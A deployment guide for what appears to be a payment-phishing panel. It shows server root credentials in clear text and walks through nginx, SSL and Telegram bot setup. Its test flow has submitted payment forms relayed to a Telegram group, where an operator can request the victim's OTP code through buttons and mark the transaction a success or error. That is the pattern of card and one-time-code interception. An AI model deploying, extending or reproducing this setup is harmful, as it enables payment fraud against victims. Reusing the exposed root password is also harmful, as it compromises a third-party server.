# 🚀 Deployment Guide

## Server Information
- **IP**: 94.103.1.92
- **OS**: Ubuntu 22.04
- **User**: root
- **Password**: OAI31bcxHE4i
- **Location**: Germany
- **Expires**: 11.04.2026

## Quick Deployment Steps

### 1. Connect to Server
```bash
ssh root@94.103.1.92
# Password: OAI31bcxHE4i
```

### 2. Clone Repository
```bash
cd /var/www
git clone https://github.com/p1r0t/122323.git
cd 122323
```

### 3. Run Installation Script
```bash
chmod +x install.sh
./install.sh
```

The script will ask you for:
- **Domain name** (e.g., payment.example.com)
- **Telegram Bot Token** (get from @BotFather)
- **Telegram Chat ID** (your group ID, starts with -100)

### 4. Configure DNS
Point your domain to server IP:
```
A Record: @ → 94.103.1.92
A Record: www → 94.103.1.92
```

Wait 5-10 minutes for DNS propagation.

### 5. Setup Telegram Bot

#### Get Bot Token:
1. Open Telegram, find @BotFather
2. Send `/newbot`
3. Follow instructions
4. Copy the token (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

#### Get Group Chat ID:
1. Create a new Telegram group
2. Add your bot to the group
3. Make bot an admin
4. Send a message in the group
5. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
6. Find `"chat":{"id":-100xxxxxxxxx}` - this is your Chat ID

See `TELEGRAM_GROUP_SETUP.md` for detailed instructions.

### 6. Test the System

Visit your domain:
```
https://your-domain.com
```

Test payment flow:
1. Fill the form
2. Submit payment
3. Check Telegram group - you should see notification with buttons
4. Click "💬 Chat" to test support chat
5. Click "📱 OTP" to request OTP code
6. Click "✅ Success" or "❌ Error" to change status

### 7. Monitor Logs

```bash
# Nginx access logs
tail -f /var/log/nginx/access.log

# Nginx error logs
tail -f /var/log/nginx/error.log

# Bot logs
tail -f /var/www/122323/public_html/logs/bot_updates.log

# Systemd bot service
journalctl -u telegram-bot -f
```

## Manual Installation (if script fails)

### Install Dependencies
```bash
apt update
apt install -y nginx php8.1-fpm php8.1-curl php8.1-mbstring certbot python3-certbot-nginx git
```

### Configure Nginx
```bash
nano /etc/nginx/sites-available/payment
```

Paste:
```nginx
server {
    listen 80;
    server_name your-domain.com www.your-domain.com;
    root /var/www/122323/public_html;
    index index.php index.html;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    }

    location /logs/ {
        deny all;
    }
}
```

Enable site:
```bash
ln -s /etc/nginx/sites-available/payment /etc/nginx/sites-enabled/
nginx -t
systemctl restart nginx
```

### Setup SSL
```bash
certbot --nginx -d your-domain.com -d www.your-domain.com
```

### Configure Bot
```bash
nano /var/www/122323/public_html/config.php
```

Update:
```php
define('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE');
define('CHAT_ID', '-100XXXXXXXXXX');
```

### Setup Webhook
Visit in browser:
```
https://your-domain.com/admin/setup_webhook.php
```

### Create Systemd Service (Optional - for polling mode)
```bash
nano /etc/systemd/system/telegram-bot.service
```

Paste:
```ini
[Unit]
Description=Telegram Bot Polling Service
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/122323/public_html/bot
ExecStart=/usr/bin/php /var/www/122323/public_html/bot/polling.php
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Enable and start:
```bash
systemctl daemon-reload
systemctl enable telegram-bot
systemctl start telegram-bot
systemctl status telegram-bot
```

## Troubleshooting

### Bot not responding
```bash
# Check webhook status
curl "https://api.telegram.org/bot<YOUR_TOKEN>/getWebhookInfo"

# Remove webhook (if using polling)
curl "https://api.telegram.org/bot<YOUR_TOKEN>/deleteWebhook"

# Check bot service
systemctl status telegram-bot
journalctl -u telegram-bot -n 50
```

### Permission errors
```bash
chown -R www-data:www-data /var/www/122323
chmod -R 755 /var/www/122323
chmod -R 777 /var/www/122323/public_html/logs
```

### PHP errors
```bash
tail -f /var/log/nginx/error.log
tail -f /var/log/php8.1-fpm.log
```

## Security Checklist

- [ ] Change default passwords
- [ ] Setup firewall (UFW)
- [ ] Enable fail2ban
- [ ] Regular backups
- [ ] Monitor logs
- [ ] Keep system updated
- [ ] Use strong Bot Token
- [ ] Restrict Telegram group access

## Backup Commands

```bash
# Backup logs
tar -czf backup-logs-$(date +%Y%m%d).tar.gz /var/www/122323/public_html/logs/

# Backup config
cp /var/www/122323/public_html/config.php config.backup.php

# Full backup
tar -czf backup-full-$(date +%Y%m%d).tar.gz /var/www/122323/
```

## Update Deployment

```bash
cd /var/www/122323
git pull origin main
systemctl restart nginx
systemctl restart telegram-bot  # if using polling
```

---

**Need help?** Check README.md and TELEGRAM_GROUP_SETUP.md for more details.
